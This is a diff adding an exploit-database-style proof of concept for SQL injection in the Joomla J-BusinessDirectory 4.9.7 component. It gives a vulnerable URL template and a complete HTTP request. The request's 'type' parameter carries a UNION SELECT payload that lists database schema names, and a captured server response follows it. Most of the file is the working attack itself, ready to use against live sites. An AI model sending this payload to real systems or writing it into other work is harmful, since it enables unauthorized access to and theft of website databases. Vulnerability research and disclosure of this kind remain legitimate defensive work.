@@ -1,0 +1,37 @@
+# Exploit Title: Joomla! Component J-BusinessDirectory 4.9.7 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://cmsjunkie.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/directory-a-documentation/directory/j-businessdirectory/
+# Version: 4.9.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_jbusinessdirectory&task=categories.getCategories&type=[SQL]&term=a
+# 
+
+GET /[PATH]/index.php?option=com_jbusinessdirectory&task=categories.getCategories&type=1%20union%20select%20(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),2--%20-&term=a HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: __cfduid=d35dbe4de0d461bf69a9165df0f9691951548240991; 79a1b3ae870a3fab009030106c9fb887=eeab77f1b87057d5ad12b61071048ad6; PHPSESSID=c1088ee33a3f4770dd333f9605b9e44f; 704a7cf3f453ec2db97de2f28ef169f8=fb9a121113ff0e6cc6da546a82f2452e
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+HTTP/1.1 200 OK
+Date: Wed, 23 Jan 2019 15:45:13 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: max-age=172800
+Expires: Fri, 25 Jan 2019 15:45:13 GMT
+Alt-Svc: h2=":443"; ma=60
+Server: cloudflare
+CF-RAY: 49da034bc2faba72-ATL
